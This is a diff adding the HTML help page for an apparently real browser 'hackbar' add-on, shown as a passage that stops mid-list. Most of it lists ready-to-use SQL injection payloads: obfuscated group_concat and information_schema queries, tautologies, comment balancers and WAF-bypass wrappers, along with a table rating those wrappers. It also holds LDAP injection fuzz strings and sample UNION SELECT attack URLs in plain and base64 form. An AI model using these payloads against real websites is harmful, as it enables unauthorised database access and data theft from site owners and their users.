+              <li>/*!50000gRouP_cOnCaT*/()</li>
+              <li>/*!50000Gr%6fuP_c%6fnCAT*/()</li>
+              <li>unhex(hex(group_concat(table_name)))</li>
+              <li>unhex(hex(/*!group_concat*/(/*!table_name*/)))</li>
+              <li>unhex(hex(/*!12345group_concat*/(table_name)))</li>
+              <li>unhex(hex(/*!12345group_concat*/(/*!table_name*/)))</li>
+              <li>unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))</li>
+              <li>unhex(hex(/*!50000group_concat*/(table_name)))</li>
+              <li>unhex(hex(/*!50000group_concat*/(/*!table_name*/)))</li>
+              <li>unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))</li>
+              <li>convert(group_concat(table_name)+using+ascii)</li>
+              <li>convert(group_concat(/*!table_name*/)+using+ascii)</li>
+              <li>convert(group_concat(/*!12345table_name*/)+using+ascii)</li>
+              <li>convert(group_concat(/*!50000table_name*/)+using+ascii)</li>
+              <li>CONVERT(group_concat(table_name)+USING+latin1)</li>
+              <li>CONVERT(group_concat(table_name)+USING+latin2)</li>
+              <li>CONVERT(group_concat(table_name)+USING+latin3)</li>
+              <li>CONVERT(group_concat(table_name)+USING+latin4)</li>
+              <li>CONVERT(group_concat(table_name)+USING+latin5)</li>
+            </ul>
+          </div>
+        <li class="accordion">Polygon</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>+div+0</li>
+              <li>div false</li>
+              <li>Having 1=0</li>
+              <li>having false</li>
+              <li>and false</li>
+              <li>and null</li>
+              <li>AND 1=0</li>
+              <li>and(1)=(0)</li>
+              <li>and (1)!=(0)</li>
+              <li>and 2>3</li>
+              <li>%26%26 null</li>
+              <li>and point(29,9)</li>
+              <li>and mod(9,4)</li>
+              <li>and power(5,5)</li>
+              <li>and Radians(point(53,12))</li>
+              <li>and polygon(point(53,12))</li>
+              <li>Multipolygon(point(53,12))</li>
+              <li>Linestring(point(53,12))</li>
+              <li>Multilinestring(point(53,12))</li>
+              <li>Geometrycollection(point(53,12))</li>
+            </ul>
+          </div>
+        <li class="accordion">Schema</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -</li>
+              <li>/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -</li>
+              <li>/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -</li>
+              <li>/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -</li>
+              <li>/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table</li>
+              <li>/*!50000frOm*/+/*!50000information_schema*/%252e/**/columns</li>
+            </ul>
+          </div>
+        <li class="accordion">Calculation</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>or 1=1</li>
+              <li>or 0=0</li>
+              <li>or 25-10-5=5</li>
+              <li>or 20-5-5=10</li>
+              <li>or 25-5-5=15</li>
+              <li>or 5*5*1=25</li>
+              <li>or 5*5+5=30</li>
+              <li>Or 1 Less Than 0</li>
+            </ul>
+          </div>
+        <li class="accordion">Balancer</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li class="accordion">FIX TAB 1</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li class="accordion">Integer Based</li>
+                      <div class="panel">
+                        <ul class="query">
+                          <li>--</li>
+                          <li>-- -</li>
+                          <li>--+-</li>
+                          <li>)--</li>
+                          <li>)-- -</li>
+                          <li>)--+-</li>
+                          <li>))--</li>
+                          <li>))-- -</li>
+                          <li>))--+-</li>
+                          <li>;%00</li>
+                          <li>) ;%00</li>
+                          <li>));%00</li>
+                          <li>%23</li>
+                          <li>%60</li>
+                          <li>%90</li>
+                          <li>and 1=1</li>
+                          <li>and '1'='1</li>
+                          <li>and (1)=(1 </li>
+                          <li>php?id=(1) -- -</li>
+                        </ul>
+                      </div>
+                    <li class="accordion">String Based</li>
+                      <div class="panel">
+                        <ul class="query">
+                          <li>'--+-</li>
+                          <li>')-- -</li>
+                          <li>')--+-</li>
+                          <li>'))-- -</li>
+                          <li>'))--+-</li>
+                          <li>';%00</li>
+                          <li>');%00</li>
+                          <li>'));%00</li>
+                          <li>'%23</li>
+                          <li>'%60</li>
+                          <li>'%90</li>
+                          <li>' and 1=1</li>
+                          <li>' and '1'='1</li>
+                          <li>' and (1)=(1 </li>
+                          <li>php?id=(1') -- -</li>
+                        </ul>
+                      </div>
+                    <li class="accordion">String Based Double Quotes</li>
+                      <div class="panel">
+                        <ul class="query">
+                          <li>"-- -</li>
+                          <li>"--+-</li>
+                          <li>"%23</li>
+                          <li>")-- -</li>
+                          <li>")--+-</li>
+                          <li>"))--+-</li>
+                          <li>";%00</li>
+                          <li>") ;%00</li>
+                          <li>"));%00</li>
+                          <li>"%60</li>
+                          <li>"%90</li>
+                          <li>" and 1=1</li>
+                          <li>" and '1'='1</li>
+                          <li>" and (1)=(1 </li>
+                          <li>php?id=(1") -- -</li>
+                        </ul>
+                      </div>
+                  </ul>
+                </div>
+              <li class="accordion">FIX TAB 2</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>/*</li>
+                    <li>--/*</li>
+                    <li>\\--+</li>
+                    <li>\\-- +</li>
+                    <li>#--+</li>
+                    <li>#-- -</li>
+                    <li>--++</li>
+                    <li>+--+</li>
+                    <li>'))%23</li>
+                    <li>a'))%60</li>
+                    <li>'));%00</li>
+                    <li>');%00</li>
+                    <li>')order by 10;%00</li>
+                  </ul>
+                </div>
+              <li class="accordion">FIX TAB 3</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>AND'1</li>
+                    <li>or'1</li>
+                    <li>AND1='1</li>
+                    <li>and 1=0</li>
+                    <li>') and true</li>
+                    <li>') and false</li>
+                    <li>') or true</li>
+                    <li>') or false</li>
+                    <li>' and true</li>
+                    <li>' and false</li>
+                    <li>' or true</li>
+                    <li>' or false</li>
+                    <li>and x(point(0,0)) -- -</li>
+                  </ul>
+                </div>
+            </ul>
+          </div>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">CUSTOM</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li class="">CUSTOM DIOS (10 Slots)<span class="new">new</span></li>
+        <li class="">CUSTOM XSS (10 Slots)<span class="new">new</span></li>
+        <li class="">CUSTOM QUERY (10 Slots)<span class="new">new</span></li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">ERROR/DOUBLE QUERY</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>Error Based</li>
+         <li>XPATH EXTRACTVALUE</li>
+         <li>XPATH UPDATEXML</li>
+         <li>POLYGON / MULTIPOINT</li>
+         <li>MULTIPOINT DIOS</li>
+         <li>Advance Error based (MySQL >=5.5)</li>
+         <li>Dios by MadBlood (MySQL >=5.5)</li>
+         <li>Double Query Based</li>
+         <li>MSSQL ERRORBASED<span class="new">new</span></li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">TOOLS</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>Admin Bypass Queries</li>
+        <li>ADMIN PANEL LINK</li>
+        <li>2K SQLI DORKS<span class="new">new</span></li>
+        <li>Find injection type</li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">WAF BYPASS</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li class="accordion">WAF SET 1</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>/*!_STRING_*/</li>
+              <li>/^.*_STRING_.*$/</li>
+              <li>/*!51000_STRING_*/</li>
+              <li>/*!50000_STRING_*/</li>
+              <li>/*!12345_STRING_*/</li>
+              <li>/*!13337_STRING_*/</li>
+              <li>/*!00000_STRING_*/</li>
+              <li>/*!56000_STRING_*/</li>
+              <li>/*!50095_STRING_*/</li>
+              <li>/*!40122_STRING_*/</li>
+              <li>/*!OverFlow_STRING_*/</li>
+              <li>cutoffCUTOFFWAFwaf</li>
+            </ul>
+          </div>
+        <li class="accordion">WAF SET 2</li>
+          <div class="panel">
+            <ul class="query">
+              <li>/**/_STRING_/**/</li>
+              <li>+--+_STRING_+--+</li>
+              <li>/*--*/_STRING_/*--*/</li>
+              <li>_STRING_/*&a=*/()</li>
+              <li>_STRING_/*1337*/()</li>
+              <li>_STRING_/**x**/()</li>
+              <li>_STRING_/**_**/()</li>
+              <li>_STRING_/**aaa**/()</li>
+            </ul>
+          </div>
+        <li class="accordion">WAF SET 3</li>
+          <div class="panel">
+            <ul class="query">
+              <li>%0A_STRING_%0A</li>
+              <li>%0b_STRING_%0b</li>
+              <li>%0d%0A_STRING_%0d%0A</li>
+              <li>%23%0A_STRING_%23%0A</li>
+              <li>%23aa%0A_STRING_%23aa%0A</li>
+              <li>%23xyz%0A_STRING_%23xyz%0A</li>
+              <li>%23foo%0D%0A_STRING_%23foo%0D%0A</li>
+              <li>%23foo*%2F*bar%0D%0A_STRING_%23foo*%2F*bar%0D%0A</li>
+              <li>#qa%0A#%0A_STRING_#qa%0A#%0A</li>
+              <li>/*!20000%0d%0a_STRING_*/</li>
+              <li>/*!blobblobblob%0d%0a_STRING_*/</li>
+              <li>/*!f****U%0d%0a_STRING_*/</li>
+            </ul>
+          </div>
+        <li>WAF SETS</li>
+          <div class="panel">
+            <ul class="query">
+            </ul>
+          </div>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">LDAP FUZZ</p>
+    <div class="panel">
+      <ul class="query">
+        <li>*</li>
+        <li>*)(&</li>
+        <li>*))%26'</li>
+        <li>*()|&'</li>
+        <li>*(|(mail=*))</li>
+        <li>(|(objectclass=*))</li>
+        <li>*)(uid=*))(|(uid=*</li>
+        <li>*/*</li>
+        <li>*|</li>
+        <li>//*</li>
+        <li>@*</li>
+        <li>admin*</li>
+        <li>admin*)((|userpassword=*)</li>
+        <li>x' or name()='username' or 'x'='y</li>
+        <li>%2A%28%7C%28mail%3D%2A%29%29</li>
+        <li>*(|(mail=*))</li>
+        <li>*(|(objectclass=*))</li>
+        <li>x' or name()='username' or 'x'='y</li>
+        <li>admin*)((|userpassword=*)</li>
+        <li>*)(uid=*))(|(uid=*</li>
+        <li>%2A%28%7C%28objectclass%3D%2A%29%29</li>
+        <li>%2A%7C</li>
+        <li>%7C</li>
+      </ul>
+    </div>
+  </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">ENCODING</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>BASE64 ENCODE</li>
+        <li>BASE DECODE</li>
+        <li>URL ENCODE</li>
+        <li>URL DECODE</li>
+        <li>HEX ENCODING</li>
+        <li>HEX DECODING</li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">0xHTML</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>&lt;br&gt;</li>
+        <li>&lt;br&gt;&lt;br&gt;</li>
+        <li>\n<span class="new">new</span></li>
+        <li>Separator &lt;br&gt;</li>
+        <li>&lt;li&gt;</li>
+        <li>&lt;b&gt;</li>
+        <li>&lt;/b&gt;</li>
+        <li>&lt;font face=courier&gt;</li>
+        <li>&lt;font color=red&gt;</li>
+        <li>&lt;font color=blue&gt;</li>
+        <li>&lt;font color=green&gt;</li>
+        <li>&lt;font color=purple&gt;</li>
+        <li>&lt;font color=magenta&gt;</li>
+        <li>&lt;font color=custom&gt;<span class="new">new</span></li>
+        <li>&lt;/font&gt;</li>
+        <li>&lt;img src=https://yourimagelink.com/image.jpg&gt;<span class="new">new</span></li>
+        <li>&lt;div&gt;</li>
+        <li>&lt;/div&gt;</li>
+        <li>&lt;marquee&gt;</li>
+        <li>&lt;/marquee&gt;</li>
+        <li>&lt;/title&gt;</li>
+        <li>&lt;/img&gt;</li>
+        <li>&lt;/a&gt;</li>
+        <li>&lt;/p&gt;</li>
+        <li>"&gt;</li>
+        <li>'&gt;</li>
+        <li>/&gt;</li>
+        <li>"/&gt;</li>
+        <li>--&gt;<span class="new">new</span></li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">ENCYPTION</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>MD5 Hash</li>
+        <li>SHA-1 Hash</li>
+        <li>SHA-256 Hash</li>
+        <li>Rot13</li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">OTHER</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>AddSlashes</li>
+        <li>StripSlashes</li>
+        <li>Strip Spaces</li>
+        <li>Reverse </li>
+        <li>lowercase</li>
+        <li>UPPERCASE</li>
+        <li>RaNdOmCaSe</li>
+        <li>buffer OverFlow</li>
+        <li>Usefull String</li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">XSS</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>XSS cheat Sheet 1</li>
+        <li>XSS cheat Sheet 2</li>
+        <li>XSS cheat Sheet 3</li>
+        <li>String.fromCharCode()</li>
+        <li>HTML Character</li>
+        <li>Alert(XSS)</li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">LFI</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>FLI cheat Sheet 1</li>
+        <li>FLI cheat Sheet 2</li>
+        <li>FLI fliter</li>
+        <li>FLI Wrapper</li>
+        <li>FLI Wrapper (Base64)</li>
+        <li>RFI Wrapper Expect</li>
+        <li>XSS via LFI payload</li>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">LINKS</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li>Alien Posts</li>
+        <li class="accordion">ADDONS LINKS</li>
+          <div class="panel">
+            <ul class="query">
+              <li>Source Veiwer</li>
+              <li>Live Http Header</li>
+              <li>Alien Tamper</li>
+              <li>No Redirect</li>
+              <li>Hoxx VPN</li>
+              <li>Web RTC</li>
+              <li>Temp Mail</li>
+              <li>AdBlocker Genius Pro </li>
+              <li>Theme</li>
+            </ul>
+          </div>
+        <li class="accordion">USEFULL LINKS</li>
+          <div class="panel">
+            <ul class="query">
+              <li>XXX</li>
+              <li>Exploit DB</li>
+              <li>Git Hub</li>
+              <li>SecurityIdiots</li>
+              <li>Practice Lab</li>
+              <li>View DNS Info</li>
+              <li>HASH KILLER</li>
+              <li>MD5 Decrypt</li>
+              <li>SHA1 Decrypter</li>
+              <li>Admin Page Finder</li>
+              <li>Shell Finder</li>
+              <li>MY IP</li>
+              <li>Hash Decrypter</li>
+              <li>String Encoder</li>
+              <li>Hash Identifier</li>
+              <li>Domain / IP Whois</li>
+            </ul>
+          </div>
+      </div>
+    </ul>
+  </div>
+  </div>
+</div> 
+  <div id="Tools" class="tabcontent">
+    <div class="section-title text-center">
+      <h2>Tools</h2>
+    </div>
+    <div class="row">
+  <div class="section-title">
+    <h3>Restore Defaults</h3>
+  </div>
+  <div class="column">
+    <img src="images/tools.png" style="width:100%" onclick="openModalTools();currentSlideTools(1)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <p><b>Restore Defaults</b></p>
+    <p>this can restore in to the defaults style</p>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Export Prerence ( Theme )</h3>
+  </div>
+  <div class="column">
+    <img src="images/export_txt.png" style="width:100%" onclick="openModalTools();currentSlideTools(2)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <p><b>Export Prerence ( txt )</b></p>
+    <p>1. change the value of color,font,icon etc.</p>
+    <p>2. goto setting </p>
+    <p>3. select <b>Export preferences</b></p>
+    <p>3. save the preferences</p>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Export Prerence ( Theme )</h3>
+  </div>
+  <div class="column">
+    <img src="images/import_txt.png" style="width:100%" onclick="openModalTools();currentSlideTools(4)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <p><b>Import Prerence ( txt )</b></p>
+    <p>1. goto setting</p>
+    <p>2. select <b>Import preferences</b></p>
+    <p>3. Select the exported <b>txt</b> preferences</p>
+    <p>4. Restart your browser</p>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Export Prerence ( Theme )</h3>
+  </div>
+  <div class="column">
+    <img src="images/export_json.png" style="width:100%;height: 100%;" onclick="openModalTools();currentSlideTools(6)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <p><b>Export Prerence ( txt )</b></p>
+    <p>1. change the value of color,font,icon etc.</p>
+    <p>2. goto setting </p>
+    <p>3. select <b>Export preferences</b></p>
+    <p>3. save the preferences</p>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Export Prerence ( Theme )</h3>
+  </div>
+  <div class="column">
+    <img src="images/import_json.png" style="width:100%" onclick="openModalTools();currentSlideTools(8)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <p><b>Import Prerence ( txt )</b></p>
+    <p>1. goto setting</p>
+    <p>2. select <b>Import preferences</b></p>
+    <p>3. Select the exported <b>json</b> preferences</p>
+    <p>4. Restart your browser</p>
+  </div>
+</div>
+<div class="row">
+    <div class="column">
+        <video style="width:100%" controls>
+        <source src="vids/import preferences.mp4" type="video/mp4">
+      </video>
+    </div>
+    <div class="column">
+      <p><b>watch the video to learn in importing preferences </b></p>
+    </div>
+  </div>
+<div id="modal-tools" class="modal">
+  <span class="close cursor" onclick="closeModalTools()">&times;</span>
+  <div class="modal-content">
+
+    <div class="SlidesTools">
+      <div class="numbertext">1 / 9</div>
+      <img src="images/tools.png" style="width:100%" class="image-modal-tools cursor" alt="Restore Defaults">
+    </div>
+    <div class="SlidesTools">
+      <div class="numbertext">2 / 9</div>
+      <img src="images/export_txt.png" style="width:100%" class="image-modal-tools cursor" alt="Export preference (txt)">
+    </div>
+    <div class="SlidesTools">
+      <div class="numbertext">3 / 9</div>
+      <img src="images/save_txt.png" style="width:100%" class="image-modal-tools cursor" alt="save preference (txt)">
+    </div>
+    <div class="SlidesTools">
+      <div class="numbertext">4 / 9</div>
+      <img src="images/import_txt.png" style="width:100%" class="image-modal-tools cursor" alt="Import preference (txt)">
+    </div>
+    <div class="SlidesTools">
+      <div class="numbertext">5 / 9</div>
+      <img src="images/open_txt.png" style="width:100%" class="image-modal-tools cursor" alt="Open preference (txt)">
+    </div>
+
+    <div class="SlidesTools">
+      <div class="numbertext">6 / 9</div>
+      <img src="images/export_json.png" style="width:100%" class="image-modal-tools cursor" alt="Export preference (json)">
+    </div>
+    <div class="SlidesTools">
+      <div class="numbertext">7 / 9</div>
+      <img src="images/save_json.png" style="width:100%" class="image-modal-tools cursor" alt="save preference (json)">
+    </div>
+    <div class="SlidesTools">
+      <div class="numbertext">8 / 9</div>
+      <img src="images/import_json.png" style="width:100%" class="image-modal-tools cursor" alt="Import preference (json)">
+    </div>
+    <div class="SlidesTools">
+      <div class="numbertext">9 / 9</div>
+      <img src="images/open_json.png" style="width:100%" class="image-modal-tools cursor" alt="Open preference (json)">
+    </div>
+
+    <a class="prev" onclick="plusSlidesTools(-1)">&#10094;</a>
+    <a class="next" onclick="plusSlidesTools(1)">&#10095;</a>
+
+    <div class="caption-container">
+      <p id="caption-tools"></p>
+    </div>
+  </div>
+</div>
+  </div>
+  <div id="About" class="tabcontent">
+    <div class="section-title-about text-center">
+      <h2>About Me</h2>
+    </div>
+  <div class="row">
+    <div class="about-column">
+      <img src="images/referrer.png" style="width:100%" onclick="openModal();currentSlide(3)" class="hover-shadow cursor">
+    </div>
+    <div class="about-column description">
+      <p>Hi im <a href="https://fb.me/PH.HITACHI.GOV.PH" class="ph-hitachi"><b>Ph.Hitachi</b></a> Im Not a Pro it's Only a Passion. im a certified Programmer but programmer makes you fvcking hacker. if you think you deserve something great and not ordinary than you have to do something great not ordinary</p>
+    </div>
+  </div>
+
+  </div>
+  <div id="Function" class="tabcontent">
+  <h3>WAF BYPASS</h3>
+      <p>Waf Bypass replacing in Space &amp; Parenthesis </p>
+      <p>Ex: <b>ORDER/**/BY or USER/**/()</b></p>
+    <input type="search" name="search" id="searchWaf" placeholder="Search.." onkeyup="searchWaf()" title="search waf" style="float:right">
+      <table class="table-all" id="TableWaf">
+        <tbody>
+          <tr>
+            <th>Queries</th>
+            <th>Space</th>
+            <th>Parenthesis</th>
+          </tr>
+          <tr>
+            <td>/**/</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>+--+</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*--*/</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>/*&a=*/</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>/*1337*/</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>/**x**/</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>/**_**/</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>/**aaa**/</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>/*!_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/^.*_STRING_.*$/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!51000_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!50000_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!12345_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!13337_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!00000_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!56000_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!50095_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!40122_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>%0A</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>%0b</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>%0d%0A</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>%23%0A</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>%23aa%0A</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>%23xyz%0A</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>%23foo%0D%0A</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>%23foo*%2F*bar%0D%0A</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>#qa%0A#%0A</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>/*!20000%0d%0a_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!blobblobblob%0d%0a_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+          <tr>
+            <td>/*!f****U%0d%0a_STRING_*/</td>
+            <td>Yes</td>
+            <td><span class="No">No</span></td>
+          </tr>
+        </tbody>
+      </table>
+      <!---->
+      <div class="container">
+        <h1>Base64 spacer</h1>
+          <p>Base64 Spacer automatically decode base64 and add [BASE64=DecodedString]</p>
+          <p>Base64 Spacer is use to SQLI BASE64 without encode & decode </p>
+          <div class="example">
+            <h3>Example</h3>
+            <div class="code">
+              <p id="bss64Url">https://site.com/index.php?id=MTI=</p>
+            </div>
+            <button class="run" onclick="base64spacer()">Run</button>
+          </div>
+      </div>
+      <div class="container">
+        <h1>0xHEX</h1>
+          <p>0xHEX is use for print String or text in target website.</p>
+          <div class="example">
+            <h3>Example</h3>
+            <div class="code">
+              <p id="HEXUrl">localhost/index.php?id=12' Union Select 1,2,3,concat(injected by ph.hitachi),5,6,7,8,9,10-- -</p>
+            </div>
+            <button class="run" onclick="HEXEncode()">Encode</button>
+            <button class="run" onclick="HEXDecode()">Decode</button>
+          </div>
+      </div>
+      <div class="container">
+        <h1>%URL</h1>
+          <p>%URL encode and decode is use for waf bypassing and many more.</p>
+          <div class="example">
+            <h3>Example</h3>
+            <div class="code">
+              <p id="%URLsite">localhost/index.php?id=12' Union Select 1,2,3,4,5,6,7,8,9,10-- -</p>
+            </div>
+            <button class="run" onclick="URLEncode()">Encode</button>
+            <button class="run" onclick="URLDecode()">Decode</button>
+          </div>
+      </div>
+      <div class="container">
+        <h1>BASE64</h1>
+          <p>BASE64 encode and decode is use for SQLI BASE64 (encode & decode)</p>
+          <div class="example">
+            <h3>Example</h3>
+            <div class="code">
+              <p id="BS64URL">http://localhost/index.php?id=MTInIFVuaW9uIFNlbGVjdCAxLDIsMyxjb25jYXQoJ2luamVjdGVkIGJ5IHBoLmhpdGFjaGknKSw1LDYsNyw4LDksMTAtLSAt</p>
+            </div>
+            <button class="run" onclick="BASE64Encode()">Encode</button>
+            <button class="run" onclick="BASE64Decode()">Decode</button>
+          </div>
+      </div> 
+      <div class="container">
+        <h1>0bBINARY</h1>
+          <p>0bBINARY encode and decode is alternative for printing String or text like 0xHEX function</p>
+          <div class="example">
+            <h3>Example</h3>
+            <div class="code">
+              <p id="BINARYURL">http://localhost/index.php?id=12' Union Select 1,2,3,concat(0b01110000011010000010111001101000011010010111010001100001011000110110100001101001),5,6,7,8,9,10-- -</p>
+            </div>
+            <button class="run" onclick="BINARYEncode()">Encode</button>
+            <button class="run" onclick="BINARYDecode()">Decode</button>
+          </div>
+      </div>
+    </div>
+  <div id="Custom" class="tabcontent">
+    <div class="section-title text-center">
+      <h2>Customize your hackbar</h2>
+    </div>
+    <div class="description">
+      <p>Customize your hackbar features are added by <a href="" class="ph-hitachi"><b>Ph.Hitachi</b></a> for the best experience of using hackbar tools for <b>penetration testing</b> and in this hackbar you can edit or modify basic style like color,font,font-style,font-size,border,border-size,border-radius,opacity and also upload custom icon and choose icon. </p>
+    </div>
+    <p class="note">Color names, hexcodes, rgb(a) and hsl(a) values are supported for image (*.jpg, *.png, *.gif)</p>
+<div class="row">
+  <div class="section-title">
+    <h3>Hackbar Field</h3>
+  </div>
+  <div class="column">
+    <img src="images/customize.png"  onclick="openModal();currentSlide(1)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Text-Color</li>
+        <li><span class="check">&check;</span>Background-Color</li>
+        <li><span class="check">&check;</span>Border-Top</li>
+        <li><span class="check">&check;</span>Border-left</li>
+        <li><span class="check">&check;</span>Border-Bottom</li>
+        <li><span class="check">&check;</span>Border-Right</li>
+        <li><span class="check">&check;</span>Border-Size</li>
+        <li><span class="check">&check;</span>Border-Radius</li>
+        <li><span class="check">&check;</span>Font-Size</li>
+      </ul>
+    </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Font-Family</li>
+        <li><span class="check">&check;</span>Font-Style (bold & italic)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Postdata Field</h3>
+  </div>
+  <div class="column">
+    <img src="images/postdata.png"  onclick="openModal();currentSlide(2)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Text-Color</li>
+        <li><span class="check">&check;</span>Background-Color</li>
+        <li><span class="check">&check;</span>Border-Top</li>
+        <li><span class="check">&check;</span>Border-left</li>
+        <li><span class="check">&check;</span>Border-Bottom</li>
+        <li><span class="check">&check;</span>Border-Right</li>
+        <li><span class="check">&check;</span>Border-Size</li>
+        <li><span class="check">&check;</span>Border-Radius</li>
+        <li><span class="check">&check;</span>Font-Size</li>
+      </ul>
+    </div>
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
+        <li><span class="check">&check;</span>Font-Family</li>
+        <li><span class="check">&check;</span>Font-Style (bold & italic)</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="section-title">
+    <h3>Referrer Field</h3>
+  </div>
+  <div class="column">
+    <img src="images/referrer.png"  onclick="openModal();currentSlide(3)" class="hover-shadow cursor">
+  </div>
+  <div class="column">
+    <div class="list-style">
+      <ul>
